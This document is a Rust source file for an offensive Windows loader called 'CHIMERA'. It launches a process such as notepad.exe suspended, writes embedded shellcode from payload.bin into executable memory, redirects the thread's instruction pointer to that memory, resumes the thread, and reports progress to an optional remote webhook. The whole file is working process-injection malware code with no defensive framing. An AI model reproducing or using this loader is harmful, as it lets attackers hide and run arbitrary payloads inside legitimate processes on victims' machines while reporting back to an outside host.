use std::env;
use std::ffi::c_void;
use std::mem;
use std::ptr;
use std::thread;
use std::time::Duration;

type HANDLE = *mut c_void;
type LPVOID = *mut c_void;

#[repr(C)]
pub struct PROCESS_INFORMATION {
    pub h_process: HANDLE,
    pub h_thread: HANDLE,
    pub dw_process_id: u32,
    pub dw_thread_id: u32,
}

#[repr(C)]
pub struct STARTUPINFOA {
    pub cb: u32,
    pub lp_reserved: *mut u8,
    pub lp_desktop: *mut u8,
    pub lp_title: *mut u8,
    pub dw_x: u32,
    pub dw_y: u32,
    pub dw_x_size: u32,
    pub dw_y_size: u32,
    pub dw_x_count_chars: u32,
    pub dw_y_count_chars: u32,
    pub dw_fill_attribute: u32,
    pub dw_flags: u32,
    pub w_show_window: u16,
    pub cb_reserved2: u16,
    pub lp_reserved2: *mut u8,
    pub h_std_input: HANDLE,
    pub h_std_output: HANDLE,
    pub h_std_error: HANDLE,
}

#[cfg(target_arch = "x86_64")]
#[repr(C, align(16))]
pub struct CONTEXT {
    pub p1_home: [u64; 6],
    pub context_flags: u32,
    pub mx_csr: u32,
    pub seg_cs: u16, pub seg_ds: u16, pub seg_es: u16,
    pub seg_fs: u16, pub seg_gs: u16, pub seg_ss: u16,
    pub e_flags: u32,
    pub dr0: u64, pub dr1: u64, pub dr2: u64, pub dr3: u64, pub dr6: u64, pub dr7: u64,
    pub rax: u64, pub rcx: u64, pub rdx: u64, pub rbx: u64, pub rsp: u64, pub rbp: u64,
    pub rsi: u64, pub rdi: u64, pub r8: u64,  pub r9: u64,  pub r10: u64, pub r11: u64,
    pub r12: u64, pub r13: u64, pub r14: u64, pub r15: u64,
    pub rip: u64,
}

#[cfg(target_arch = "x86")]
#[repr(C)]
pub struct CONTEXT {
    pub context_flags: u32,
    pub dr0: u32, pub dr1: u32, pub dr2: u32, pub dr3: u32, pub dr6: u32, pub dr7: u32,
    pub floating_save: [u8; 112],
    pub seg_gs: u32, pub seg_fs: u32, pub seg_es: u32, pub seg_ds: u32,
    pub edi: u32, pub esi: u32, pub ebx: u32, pub edx: u32, pub ecx: u32, pub eax: u32,
    pub ebp: u32, pub eip: u32, pub seg_cs: u32, pub eflags: u32, pub esp: u32, pub seg_ss: u32,
    pub extended_registers: [u8; 512],
}

unsafe extern "system" {
    fn CreateProcessA(app: *const u8, cmd: *mut u8, pa: LPVOID, ta: LPVOID, inh: i32, flags: u32, env: LPVOID, dir: *const u8, si: *mut STARTUPINFOA, pi: *mut PROCESS_INFORMATION) -> i32;
    fn VirtualAllocEx(h: HANDLE, addr: LPVOID, sz: usize, typ: u32, prot: u32) -> LPVOID;
    fn WriteProcessMemory(h: HANDLE, base: LPVOID, buf: *const c_void, sz: usize, out: *mut usize) -> i32;
    fn GetThreadContext(h: HANDLE, ctx: *mut CONTEXT) -> i32;
    fn SetThreadContext(h: HANDLE, ctx: *const CONTEXT) -> i32;
    fn ResumeThread(h: HANDLE) -> u32;
    fn GetLastError() -> u32;
}

const CREATE_SUSPENDED: u32 = 0x00000004;
const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

#[cfg(target_arch = "x86_64")] const CONTEXT_FULL: u32 = 0x100007;
#[cfg(target_arch = "x86")]    const CONTEXT_FULL: u32 = 0x10007;

pub struct ChimeraConfig {
    pub webhook: Option<String>,
    pub target_process: String,
}

fn log_status(message: &str, webhook_url: &Option<String>) {
    println!("{}", message);

    if let Some(url) = webhook_url {
        let url_clone = url.clone();
        let msg_clone = message.to_string();
        let payload = format!(r#"{{"content": "{}"}}"#, msg_clone);
        let _ = thread::spawn(move || {
            let _ = ureq::post(&url_clone)
                .set("Content-Type", "application/json")
                .send_string(&payload);
        });
    }
}

pub fn chimera_dual_arch_hollow(shellcode: &[u8], config: &ChimeraConfig) {
    log_status("[CHIMERA][i] Initializing Thread Hijacking sequence...", &config.webhook);

    let mut si: STARTUPINFOA = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    let target_path = format!("{}\0", config.target_process);

    let success = unsafe { 
        CreateProcessA(target_path.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 
                       0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) 
    };

    if success == 0 { 
        log_status(&format!("[CHIMERA][!] CreateProcessA failed. Error: {}", unsafe { GetLastError() }), &config.webhook);
        return; 
    }
    log_status(&format!("[CHIMERA][+] Host Process Created: {} (PID: {})", config.target_process, pi.dw_process_id), &config.webhook);

    let remote_mem = unsafe { 
        VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), 
                       MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE) 
    };

    if remote_mem.is_null() {
        log_status("[CHIMERA][!] Remote allocation failed.", &config.webhook);
        return;
    }

    let mut bytes_written = 0;
    unsafe { 
        WriteProcessMemory(pi.h_process, remote_mem, shellcode.as_ptr() as _, 
                           shellcode.len(), &mut bytes_written); 
    }
    log_status(&format!("[CHIMERA][+] Wrote {} bytes to host memory.", bytes_written), &config.webhook);

    thread::sleep(Duration::from_millis(300));
    let mut ctx: CONTEXT = unsafe { mem::zeroed() };
    ctx.context_flags = CONTEXT_FULL;

    unsafe {
        if GetThreadContext(pi.h_thread, &mut ctx) != 0 {
            #[cfg(target_arch = "x86_64")] { ctx.rip = remote_mem as u64; }
            #[cfg(target_arch = "x86")]    { ctx.eip = remote_mem as u32; }

            if SetThreadContext(pi.h_thread, &ctx) != 0 {
                log_status("[CHIMERA][*] Thread context hijacked. Resuming...", &config.webhook);
                ResumeThread(pi.h_thread);
            } else {
                log_status(&format!("[CHIMERA][!] SetThreadContext failed. Code: {}", GetLastError()), &config.webhook);
            }
        } else {
            log_status(&format!("[CHIMERA][!] GetThreadContext failed. Code: {}", GetLastError()), &config.webhook);
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    let mut target_process = option_env!("CHIMERA_TARGET")
        .unwrap_or("C:\\Windows\\System32\\notepad.exe")
        .to_string();

    let mut webhook_url = option_env!("CHIMERA_WEBHOOK").map(|s| s.to_string());

    for i in 1..args.len() {
        match args[i].as_str() {
            "--webhook" => {
                if i + 1 < args.len() { webhook_url = Some(args[i + 1].clone()); }
            }
            "--target-process" => {
                if i + 1 < args.len() { target_process = args[i + 1].clone(); }
            }
            _ => {}
        }
    }

    let config = ChimeraConfig {
        webhook: webhook_url,
        target_process,
    };

    let arch = if cfg!(target_arch = "x86_64") { "64-BIT" } else { "32-BIT" };
    log_status(&format!("--- CHIMERA ENGINE: {} MODE ---", arch), &config.webhook);

    let shellcode = include_bytes!("payload.bin");
    chimera_dual_arch_hollow(shellcode, &config);
}